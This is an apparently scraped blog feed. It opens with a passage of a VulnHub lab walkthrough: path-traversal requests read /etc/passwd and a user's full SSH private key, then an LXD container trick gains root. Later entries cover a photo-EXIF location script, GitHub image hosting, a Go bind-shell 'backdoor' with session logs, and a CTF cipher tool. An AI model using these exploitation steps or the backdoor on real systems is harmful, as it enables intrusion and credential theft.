<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /lavalamp/canyoubypassme.php HTTP/1.1</span><br><span class="line">Host: 192.168.56.125</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://192.168.56.125</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.125/lavalamp/canyoubypassme.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">file=21212&amp;<span class="built_in">read</span>=Download+the+number</span><br></pre></td></tr></table></figure>

<p>edit the poc to triggerthe LFI</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file=1../../../etc/passwd&amp;<span class="built_in">read</span>=Download+the+number</span><br></pre></td></tr></table></figure>

<p>responese:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line">                &lt;div id=<span class="string">&quot;right&quot;</span>&gt;&lt;/div&gt;&lt;div align=center&gt;&lt;textarea rows=20 cols=60&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">ford:x:1000:1000:ford,,,:/home/ford:/bin/bash</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/<span class="literal">false</span></span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">sshd:x:108:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>

<p>edit again to read ford user’s ssh key</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file=1../../../home/ford/.ssh/id_rsa&amp;<span class="built_in">read</span>=Download+the+number</span><br></pre></td></tr></table></figure>

<p>and we got ford’s ssh key</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEogIBAAKCAQEAk1VUtcYuZmM1Zmm4yNpguzzeocGpMVYC540yT90QqaD2Bsal</span><br><span class="line">zYqvHKEh++bOL6QTSr0NjU9ifT/lBIVSIA0TpjUTkpdIW045H+NlgMhN0q/x6Yy2</span><br><span class="line">LofuB4LQqRzr6cP0paoOYNq1KYG3QF1ouGa4k1i0td4DepBxcu4JBMOm20E7BurG</span><br><span class="line">zo41f/YWjC5DurNjIchzl4GyBClMGSXWbIbr6sYwVx2OKyiPLFLYusrNqwJNQvxz</span><br><span class="line">Mf5yolEYI8WOXJzCfiPQ5VG8KXBH3FHu+DhFNgrJQjgowD15ZMQ1qpO/2FMhewR6</span><br><span class="line">gcDs7rCLUUXc9/7uJ7e3zHlUyDgxakYohn3YiQIDAQABAoIBAE/cfSJa3mPZeuSc</span><br><span class="line">gfE9jhlwES2VD+USPljNDGyF47ZO7Y0WuGEFv43BOe6VWUYxpdNpTqM+WKCTtcwR</span><br><span class="line">iEafT/tT4dwf7LSxXf2PAUIhUS3W+UYjY80tGTUxD3Hbn3UDJuV1nH2bj3+ENJTL</span><br><span class="line">DSyHYZ1dA/dg9HnHOfeWV4UhmJxXmOAOKgU9Z73sPn4bYy4B3jnyqWn392MsQftr</span><br><span class="line">69ZYauTjku9awpuR5MAXMJ9bApk9Q7LZYwwGaSZw8ceMEUj7hkZBtP9W9cilCOdl</span><br><span class="line">rFXnkc8CvUpLh+hX6E/JOCGsUvdPuVLWKd2bgdK099GrRaenS8SlN0AUTfyNiqg4</span><br><span class="line">VE7V8AECgYEAwoGVE+Z8Tn+VD5tzQ0twK+cP2TSETkiTduYxU3rLqF8uUAc3Ye/9</span><br><span class="line">TLyfyIEvU7e+hoKltdNXHZbtGrfjVbz6gGuGehIgckHPsZCAQLPwwEqp0Jzz9eSw</span><br><span class="line">qXI0uM7n2vSdEWfCAcJBc559JKZ5uwd0XwTPNhiUqe6DUDUOZ7kI34ECgYEAwenM</span><br><span class="line">gMEaFOzr/gQsmBNyDj2gR2SuOYnOWfjUO3DDleP7yXYNTcRuy6ke1kvMhf9fWw7h</span><br><span class="line">dq3ieU0KSHrNUQ9igFK5C8FvsB+HUyEjfVpNhFppNpWUUWKDRCypbmypLg0r+9I7</span><br><span class="line">myrdBFoYv30WKVsEHus1ye4nJzKjCtkgmjYMfQkCgYA0hctcyVNt2xPEWCTC2j8b</span><br><span class="line">C9UCwSStAvoXFEfjk/gkqjcWUyyIXMbYjuLSwNen0qk3J1ZaCAyxJ8009s0DnPlD</span><br><span class="line">7kUs93IdiFnuR+fqEO0E7+R1ObzC/JMb3oQQF4cSYBV92rfPw8Xq07RVTkL21yd8</span><br><span class="line">dQ8DO5YBYS/CW+Fc7uFPgQKBgHWAVosud792UQn7PYppPhOjBBw+xdPXzVJ3lSLv</span><br><span class="line">kZSiMVBCWI1nGjwOnsD77VLFC+MBgV2IwFMAe9qvjvoveGCJv9d/v03ZzQZybi7n</span><br><span class="line">KVGp91c8DEPEjgYhigl/joR5Ns3A9p1vu72HWret9F/a5wRVQqK5zL/Tzzgjmb3Y</span><br><span class="line">QnkBAoGAVosEGOE7GzBMefGHjQGMNKfumeJ01+Av6siAI6gmXWAYBaU618XhFEh1</span><br><span class="line">+QNoLgWvSXoBuN+pMkxnRCfMTNbD1wSk46tW3sWHkZdV31gKceOifNzMVw53bJHP</span><br><span class="line">/kto0eGJ/vgM0g9eyqmcpPTVqf7EwkJdo0LngOprNyTk+54ZiUg=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>then we easily get user.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/cynix<span class="comment"># mousepad key</span></span><br><span class="line">root@kali:~/vulnhub/cynix<span class="comment"># chmod 700 key</span></span><br><span class="line">root@kali:~/vulnhub/cynix<span class="comment"># ssh -i key ford@192.168.56.125</span></span><br><span class="line">ssh: connect to host 192.168.56.125 port 22: Connection refused</span><br><span class="line">root@kali:~/vulnhub/cynix<span class="comment"># ssh -i key ford@192.168.56.125 -p 6688</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.56.125]:6688 ([192.168.56.125]:6688)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:4l9whYX6vUaC+OGLPBYRWd7sw10HKH1wJU+FcVVeJyQ.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[192.168.56.125]:6688<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string"> _____  _    _  ____  ______ _   _ _______   __</span></span><br><span class="line"><span class="string">|  __ \| |  | |/ __ \|  ____| \ | |_   _\ \ / /</span></span><br><span class="line"><span class="string">| |__) | |__| | |  | | |__  |  \| | | |  \ V / </span></span><br><span class="line"><span class="string">|  ___/|  __  | |  | |  __| | . ` | | |   &gt; &lt;  </span></span><br><span class="line"><span class="string">| |    | |  | | |__| | |____| |\  |_| |_ / . \ </span></span><br><span class="line"><span class="string">|_|    |_|  |_|\____/|______|_| \_|_____/_/ \_\</span></span><br><span class="line"><span class="string">                                               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Fri Nov  8 16:46:44 2019 from 10.80.3.41</span></span><br><span class="line"><span class="string">ford@blume:~$ id</span></span><br><span class="line"><span class="string">uid=1000(ford) gid=1000(ford) groups=1000(ford),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),113(lxd)</span></span><br><span class="line"><span class="string">ford@blume:~$ whoami</span></span><br><span class="line"><span class="string">ford</span></span><br><span class="line"><span class="string">ford@blume:~$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">ford@blume:~$ cat user.txt</span></span><br><span class="line"><span class="string">02d6267ed96e6b615b031dafe9607151</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub274.jpg"></li>
</ul>
<h3 id="lxd-privilege-escalation"><a href="#lxd-privilege-escalation" class="headerlink" title="lxd privilege escalation"></a>lxd privilege escalation</h3><p>reference to the following article</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL2x4ZC1wcml2aWxlZ2UtZXNjYWxhdGlvbi8=">lxd privilege escalation<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>use the following commands to build the lxd image for later useage</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br></pre></td></tr></table></figure>

<p>transfer alpine-v3.11-x86_64-20200119_0151.tar.gz to victim’s machine</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/lxd-alpine-builder<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">192.168.56.125 - - [21/May/2020 00:51:58] <span class="string">&quot;GET /alpine-v3.11-x86_64-20200119_0151.tar.gz HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ford@blume:/tmp$ wget http://192.168.56.126/alpine-v3.11-x86_64-20200119_0151.tar.gz</span><br><span class="line">--2020-05-21 10:21:57--  http://192.168.56.126/alpine-v3.11-x86_64-20200119_0151.tar.gz</span><br><span class="line">Connecting to 192.168.56.126:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3226602 (3.1M) [application/gzip]</span><br><span class="line">Saving to: ‘alpine-v3.11-x86_64-20200119_0151.tar.gz’</span><br><span class="line"></span><br><span class="line">alpine-v3.11-x86_64-20200 100%[==================================&gt;]   3.08M  --.-KB/s    <span class="keyword">in</span> 0.06s   </span><br><span class="line"></span><br><span class="line">2020-05-21 10:21:57 (50.3 MB/s) - ‘alpine-v3.11-x86_64-20200119_0151.tar.gz’ saved [3226602/3226602]</span><br></pre></td></tr></table></figure>

<p>then added as an image to LXD as follows:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ford@blume:/tmp$ lxc image import ./alpine-v3.11-x86_64-20200119_0151.tar.gz --<span class="built_in">alias</span> myimage</span><br><span class="line">Image imported with fingerprint: 468c747448ec99c6b76e5a943df89a21489eb5d605ebe5d4c341a78ec217a223</span><br></pre></td></tr></table></figure>

<p>Use the list command to check the list of images</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ford@blume:/tmp$ lxc image list</span><br><span class="line">+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |</span><br><span class="line">+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">| myimage | 468c747448ec | no     | alpine v3.11 (20200119_01:51) | x86_64 | 3.08MB | May 21, 2020 at 5:39am (UTC) |</span><br><span class="line">+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+</span><br><span class="line">ford@blume:/tmp$ lxc init myimage ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">Creating ignite</span><br><span class="line">ford@blume:/tmp$ lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">Device mydevice added to ignite</span><br><span class="line">ford@blume:/tmp$ lxc start ignite</span><br><span class="line">ford@blume:/tmp$ lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ <span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>Once inside the container, navigate to /mnt/root to see all resources from the host machine.</p>
<p>After running the bash file. We see that we have a different shell, it is the shell of the container. This container has all the files of the host machine. So, we enumerated for the root flag and found it.</p>
<p>and finally find the root.txt at last</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># cd /mnt/root/root</span></span><br><span class="line">/mnt/root/root <span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">/mnt/root/root <span class="comment"># cat root.txt</span></span><br><span class="line">Oh Yeah! Finally Pwned!</span><br><span class="line"></span><br><span class="line">Here<span class="string">&#x27;s your root flag:</span></span><br><span class="line"><span class="string">b0f971eddce7bd007e9f50ca02f5fe11</span></span><br><span class="line"><span class="string">    ____   __                      __    _  __ ______</span></span><br><span class="line"><span class="string">   /  _/  / /____  _   __ ___     / /   | |/ // ____/</span></span><br><span class="line"><span class="string">   / /   / // __ \| | / // _ \   / /    |   // /     </span></span><br><span class="line"><span class="string"> _/ /   / // /_/ /| |/ //  __/  / /___ /   |/ /___   </span></span><br><span class="line"><span class="string">/___/  /_/ \____/ |___/ \___/  /_____//_/|_|\____/   </span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string">https://www.linkedin.com/in/sumit-verma-125576129/</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub275.jpg"></li>
</ul>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>change the opacity 0:0 to 1:0 to show the form</li>
<li>use LFI to read /etc/passwd and ssh key</li>
<li>lxd privilege escalation</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>获取手机拍摄照片的经纬度及详细位置的python脚本</title>
    <url>/2019/11/11/get-pic-location/</url>
    <content><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>本脚本的源码是xingag大佬的，本人只是稍作了改动，及添加了一些说明方式，使得脚本能够应用于更多场合。</p>
<p><font color="blue"><strong><em><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3hpbmdhZy8=">xingag大佬的github<i class="fa fa-external-link-alt"></i></span></em></strong></font></p>
<p><font color="red"><strong><em><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci8=">本人的github<i class="fa fa-external-link-alt"></i></span></em></strong></font></p>
<a id="more"></a>

<h3 id="脚本使用说明"><a href="#脚本使用说明" class="headerlink" title="脚本使用说明"></a>脚本使用说明</h3><ul>
<li>1.先从高德开放平台上注册后再申请一个key，如下图所示。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location.jpg"></p>
<ul>
<li>2.如下几图所示修改main.py的源代码,使其对应正确的key和要分析的图片地址。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location2.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location3.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location4.jpg"></p>
<ul>
<li>3.运行代码前，先执行下面的代码安装exifread库。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install exifread</span><br></pre></td></tr></table></figure>
<p>该库是识别图片元数据的库，使用 exifread 库可以直接读取图片文件，获取到图片的元数据，包含经度、纬度、南北纬方向、东西经方向和拍摄时间。</p>
<ul>
<li>4.运行代码时，main.py和position_utils.py必须放在同一目录下。</li>
</ul>
<p>因为通过 GPS 获取的经度、纬度和高德地图的坐标存在一定的误差，这里需要用position_utils.py脚本把坐标转换为「火星坐标系」。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location5.jpg"></p>
<h2 id="最后附上一张效果图"><a href="#最后附上一张效果图" class="headerlink" title="最后附上一张效果图"></a>最后附上一张效果图</h2><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location6.jpg"></p>
<h3 id="牛批哄哄的有没有"><a href="#牛批哄哄的有没有" class="headerlink" title="牛批哄哄的有没有?"></a><strong><em><font color="red">牛批哄哄的有没有?</font></em></strong></h3>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python脚本</tag>
        <tag>照片位置信息</tag>
      </tags>
  </entry>
  <entry>
    <title>将图片上传到github图床</title>
    <url>/2018/12/08/github-imagebed/</url>
    <content><![CDATA[<ol>
<li><strong><em>新建一个repositories</em></strong></li>
</ol>
<p><img src="/images/imagebed1.jpg"></p>
<ol start="2">
<li><strong><em>进入repositories下的wiki选项中</em></strong></li>
</ol>
<p><img src="/images/imagebed2.jpg"></p>
<ol start="3">
<li><strong><em>复制wiki对应的克隆地</em></strong></li>
</ol>
<p><img src="/images/imagebed3.jpg"></p>
<a id="more"></a>

<ol start="4">
<li><strong><em>在本地克隆项目</em></strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/FDlucifer/FDlucifer.github.io.wiki.git</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><strong><em>进入文件夹，将要上传的图片放在文件夹中</em></strong></li>
</ol>
<p><img src="/images/imagebed4.jpg"></p>
<ol start="6">
<li><strong><em>打开命令行，依次输入命令：</em></strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add 彼岸花.jpg</span><br><span class="line"></span><br><span class="line">git commit -a -m <span class="string">&quot;update&quot;</span></span><br><span class="line"></span><br><span class="line">git push </span><br></pre></td></tr></table></figure>

<ol start="7">
<li><strong><em>现在已经将图片放置Github图床</em></strong></li>
</ol>
<p><strong>图片的地址</strong> <img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/%E5%BD%BC%E5%B2%B8%E8%8A%B1.jpg" alt="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/彼岸花.jpg"></p>
]]></content>
      <categories>
        <category>网站前端样式</category>
      </categories>
      <tags>
        <tag>github imagebed</tag>
      </tags>
  </entry>
  <entry>
    <title>gobindshell-Golang-Tcp-Bind-Shell</title>
    <url>/2020/04/11/gobindshell/</url>
    <content><![CDATA[<h4 id="Golang-Tcp-Bind-Shell"><a href="#Golang-Tcp-Bind-Shell" class="headerlink" title="Golang Tcp Bind Shell"></a>Golang Tcp Bind Shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">------------------------------------------------</span><br><span class="line">A golang based tcp <span class="built_in">bind</span> shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb2JpbmRzaGVsbA==">Download gobindshell from my github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>将源代码编译好，如果目标系统是windows就在windows下的go环境中编译，目标系统是linux的话同理，将编译生成的可执行文件放到目标系统的终端里运行</p>
<ul>
<li>目标系统的环境为windows</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 172.20.10.5 5211</span></span><br><span class="line">                        welcome to lucifer11(QQ:1185151867)<span class="string">&#x27;s backdoor[default port:5211]</span></span><br><span class="line"><span class="string">[+] Connect backdoor success,press enter to join the shell :):</span></span><br><span class="line"><span class="string">Microsoft Windows [�汾 10.0.18363.752]</span></span><br><span class="line"><span class="string">(c) 2019 Microsoft Corporation����������Ȩ����</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">D:\Go\testgofiles\oldboygo\goprogram\gobackdoor&gt;whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">lucifer11\hasee</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">D:\Go\testgofiles\oldboygo\goprogram\gobackdoor&gt;net user</span></span><br><span class="line"><span class="string">net user</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\\LUCIFER11 ���û��ʻ�</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">Administrator            ASPNET                   DefaultAccount           </span></span><br><span class="line"><span class="string">Guest                    HASEE                    WDAGUtilityAccount       </span></span><br><span class="line"><span class="string">�����ɹ����ɡ�</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">D:\Go\testgofiles\oldboygo\goprogram\gobackdoor&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><img src="https://raw.githubusercontent.com/FDlucifer/gobindshell/master/showpics/1.jpg"></p>
</li>
<li><p>目标系统为linux</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.66.6 5211</span></span><br><span class="line">                        twelcome to lucifer11(QQ:1185151867)<span class="string">&#x27;s backdoor[default port:5211]                                 </span></span><br><span class="line"><span class="string">[+] Connect backdoor success,press enter to join the shell :):                                                             </span></span><br><span class="line"><span class="string">id                                                                                                                         </span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) 组=0(root)                                                                                         </span></span><br><span class="line"><span class="string">whoami                                                                                                                     </span></span><br><span class="line"><span class="string">root                                                                                                                       </span></span><br><span class="line"><span class="string">pwd                                                                                                                        </span></span><br><span class="line"><span class="string">/root</span></span><br><span class="line"><span class="string">uname -a</span></span><br><span class="line"><span class="string">Linux kali 5.4.0-kali4-amd64 #1 SMP Debian 5.4.19-1kali1 (2020-02-17) x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/gobindshell/master/showpics/2.jpg"></li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>轻量级的golang tcp bind shell</li>
<li>同时支持windows和linux环境</li>
<li>能多平台交叉编译使用</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>有任何问题请联系qq:1185151867 :)</li>
</ul>
<p>:) enjoy it ! :)</p>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>goendecoder-golang-ctf加解密工具-支持多达65种加密解密方法-可根据实际需要修改源码以解密密文</title>
    <url>/2020/03/25/goendecoder/</url>
    <content><![CDATA[<p><font color="green">很长一段时间没有发vulnhub靶机的博客了，因为在闭关修炼golang语言，所以废话不多说，下面是这段时间的成果，由本菜独立开发，勿喷!!! :)</font></p>
<h4 id="Golang-CTF加解密工具"><a href="#Golang-CTF加解密工具" class="headerlink" title="Golang CTF加解密工具"></a>Golang CTF加解密工具</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">----------------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">----------------------------------------------------------</span></span><br><span class="line"><span class="string">QQ 1185151867</span></span><br><span class="line"><span class="string">--############################ :)hack all asshole things:)</span></span><br><span class="line"><span class="string">----------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb2VuZGVjb2Rlcg==">Download<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="Example-Pics"><a href="#Example-Pics" class="headerlink" title="Example Pics"></a>Example Pics</h3><p><img src="https://raw.githubusercontent.com/FDlucifer/goendecoder/master/showpics/show.jpg"></p>
<p><img src="https://raw.githubusercontent.com/FDlucifer/goendecoder/master/showpics/show1.jpg"></p>
<a id="more"></a>

<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">----------------------------------------------------------</span><br><span class="line">[+] please choose your choice to encode or decode strings:</span><br><span class="line">[+] usage: [your string to convert + choice number]</span><br><span class="line">[+] list of choices:</span><br><span class="line">----------------------------------------------------------</span><br></pre></td></tr></table></figure>

<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><h2 id="En-Dedode-a-string-without-spaces-using-ECC-Encryption"><a href="#En-Dedode-a-string-without-spaces-using-ECC-Encryption" class="headerlink" title="En/Dedode a string without spaces using ECC Encryption"></a>En/Dedode a string without spaces using ECC Encryption</h2><ul>
<li>first generate ecc public and private key</li>
</ul>
